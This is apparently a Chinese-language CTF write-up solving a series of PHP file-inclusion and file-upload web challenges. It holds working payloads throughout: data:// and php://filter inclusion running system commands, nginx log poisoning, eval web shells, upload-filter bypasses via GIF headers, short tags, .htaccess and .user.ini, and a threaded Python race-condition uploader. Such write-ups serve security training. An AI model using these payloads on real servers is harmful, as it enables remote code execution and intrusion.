# 文件包含

## EZFL
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666101673_image.png)
有两段注释
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666203900_image.png)
直接`?file=/flag.txt`



## EZFL_1
还是上一题的位置

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666483575_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783667212802_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783667168391_image.png)

## EZFL_2

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783725879081_image.png)
1.`?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=flag.php`base大概率被过滤了，换 iconv 这类编码，把内容转成 UTF-16 后再 include

-------------------------------------------------
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726064441_image.png)
2.`?file=data:,<?php system('tac flag.php')?>`

data伪协议把后面的字符串伪装成文件内容，include 包含它时会解析执行其中的 PHP 代码。







## EZFL_3
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783725025986_image.png)
base64->`没有更多提示给你了，孩子。从现在开始，你得靠自己了。`
data伪协议

`?file=data:,<?php system('ls /')?>`

找到flag文件
`?file=data:,<?php system('cat /flag-SEYERldO4SFuwcvP5hKMwStLHW5yhI.txt')?>`



## EZFL_4
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726714869_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726795323_image.png)

看样子吧php过滤了

`?file=data:,<?system('cat flag.php ')?>`

用通配符`*`: `?file=data:,<?system('cat f*')?>`然后查看源码

## EZFL_5
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726979910_image.png)
把data伪协议过滤了,改用PHP伪协议
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783727340450_image.png)
用BP传POST

## EZFL_6
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783824149540_image.png)
虽然把PHP和data都过滤了，但是还可以包含文件。
我们可以去包含日志，在日志中注入代码
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014104609_image.png)
`/etc/passwd`访问确认文件包含存在
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014309979_image.png)
日志目录`/var/log/nginx/access.log`

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014997713_image.png)
可以找到`qingcenctf.txt`这个文件，直接`cat /qingcenctf.txt`即可

## EZFL_7
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784015176647_image.png)




# 文件上传
## EZFU
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027704804_image.png)
没有过滤，上传一个1.php 一句话木马`<?php eval($_POST[1]);?>`
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027691055_image.png)
接下来就是一般操作

在目录中没找到flag，在phpinfo中发现了


## EZFU_1
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027952567_image.png)
只让传照片了

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028107605_image.png)
前端验证，随便上传照片，抓包，直接修改后缀和内容。试了一下后端没有验证
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028344376_image.png)

然后直接访问即可
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028582720_image.png)
flag还是在phpinfo()中

## EZFU_2
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028691764_image.png)
这次前端验证没了，上传一句话木马，显示文件类型不允许，后端加了校验。
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028968660_image.png)
用1.txt试了一下，对文件内容也有验证，经过多次尝试对内容php 和= 有过滤

----
可以使用`.phtml`作为后缀

`.phtml` 本质**就是 PHP 文件**，和 `.php` 功能完全一致，只是后缀不同。

----
直接就上传了，内容也没有检验
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030122194_image.png)

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030112059_image.png)


## EZFU_3
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030539079_image.png)

不可以直接传脚本文件，抓包传

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030745290_image.png)
检验文件头了  
给文件内容加上文件头才能绕过，最简单的就是加 GIF 头，把上传文件内容改为：
 ``GIF89a <?php eval($_POST[1]);?>``
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785031024647_image.png)	

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030991845_image.png)

EZFU_4
-
又过滤了文件内容，经测试文件内容中不能出现 `<?php `，直接用短标签 `<?=` 绕过（需目标环境开启 short_open_tag）：
提交1.phtml
```
GIF89a
<?= eval($_POST[1]);?>
```

EZFU_5
-
注意这次要改文件类型`Content-Type: image/png`

对php过滤了，还得用短标签
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785562235237_image.png)

[参考文件](https://blog.csdn.net/qsuperm/article/details/160826553)


EZFU_6
-
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785562623397_image.png)

发现是`eval`被过滤了,可以使用反引号，传1=env

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785563078645_image.png)


env 是 Linux/Unix 系统自带命令，作用：打印当前进程所有环境变量

`` `env` ``=> `echo env`

EZFU_7
-
当前服务器环境是 Apache ，尝试上传 `.htaccess` 文件：
`AddType application/x-httpd-php .png
`
再传`1.png`  内容``<?= `$_POST[1]`; ?>``
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785815977877_image.png)

EZFU_8
-
这一题`.htaccess` 文件失效，在upload有index，可以使用`.user.ini`  

传user.ini内容：`auto_prepend_file=1.png`   包含1.png
再传 1.png 内容``<?= `$_POST[1]`; ?>``
访问 `/upload/`给post `1=env`

EZFU_9
-
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785816661661_image.png)

服务器后端执行“恢复”操作时，它会解压这个文件。如果这个压缩包里包含一个 shell.php，那么解压完成后，服务器的磁盘上就会凭空多出一个 shell.php 文件

先写一个shell.php，用7z压缩，格式bzip2
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785817736967_image.png)
上传后自动解压   目录uploads/shell.php   传post，flag在phpinfo中
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785817583529_image.png)

EZFU_10
-
bp爆破弱密码   账号`admin` 密码 ` 123456`

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785817923125_image.png)
重新制作  1.phtml   内容 ``<?php phpinfo(); ?>``   bzip2压缩，上传

EZFU_11
-
我们上传文件发现被很快删除了
bp无限发包`<?php system('cat /flag');?>`
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785819431057_image.png)
然后访问/upload/1.php
```
import requests                                    # 导入 requests，用于发送 HTTP 请求。
import threading                                   # 导入 threading，用于创建线程同步事件。
from concurrent.futures import ThreadPoolExecutor, as_completed  # 导入线程池及按完成顺序遍历任务的工具。

BASE_URL = "http://docker.qingcen.net:44132/"      # 定义目标 CTF 服务的基础地址。
PAYLOAD = b"<?php system('cat /flag');?>"          # 定义要上传的 PHP 字节内容，执行命令读取 /flag。
STOP = threading.Event()                           # 创建全局停止事件，任一线程成功后通知其他线程停止。

def worker():                                      # 定义单个并发工作线程执行的任务。
    with requests.Session() as s:                  # 创建并自动关闭独立 HTTP 会话，以复用连接和 Cookie。
        while not STOP.is_set():                   # 在未收到停止信号时持续尝试上传。
            try:                                   # 捕获请求或响应解析过程中的异常，防止线程直接退出。
                r = s.post(                        # 向目标根路径发送 POST 上传请求。
                    f"{BASE_URL}/",                # 拼接请求地址；BASE_URL 已带 /，这里会产生双斜杠但通常可用。
                    files={"image": ("shell.php", PAYLOAD, "application/x-php")},         # 以 image 字段上传名为 shell.php 的 PHP 文件。
                    timeout=3,                     # 设置三秒超时，避免网络异常长期阻塞线程。
                )                                  # 获取上传接口的 HTTP 响应。
                path = r.json().get("file_url")    # 将响应解析为 JSON，并读取服务器返回的上传文件路径。
                if not path:                       # 若没有返回文件路径，则认为本次上传未成功或返回格式不符合预期。
                    continue                       # 跳过当前轮次并立即继续下一次尝试。

                text = s.get(f"{BASE_URL}/{path.lstrip('/')}", timeout=3).text.strip()    # 请求上传后的文件并清除首尾空白字符。
                if text.startswith("flag{") and text.endswith("}"):                       # 判断响应是否符合常见 CTF flag 格式。
                    STOP.set()                     # 通知其余工作线程停止继续请求。
                    return text                    # 返回找到的 flag。
            except (requests.RequestException, ValueError):                               # 忽略 HTTP 错误、超时及 JSON 解析错误。
                pass                               # 本轮失败后不做处理，继续循环重试。

def main():                                        # 定义程序主入口函数。
    with ThreadPoolExecutor(max_workers=20) as pool:        # 创建最多同时运行 20 个工作线程的线程池。
        futures = [pool.submit(worker) for _ in range(20)]  # 提交 20 个 worker 任务，并保存对应的 Future 对象。
        for f in as_completed(futures):                     # 按任务完成的先后顺序获取 Future。
            flag = f.result()                               # 取得已完成任务的返回值；未找到时通常为 None。
            if flag:                                        # 若某个线程找到有效 flag。
                print(flag)                                 # 在终端输出 flag。
                return                                      # 结束主函数；线程池退出时会等待已提交任务结束。

if __name__ == "__main__":          # 仅在该脚本被直接执行时调用 main，而非被其他模块导入时。
    main()                          # 启动并发上传与访问流程。
```



























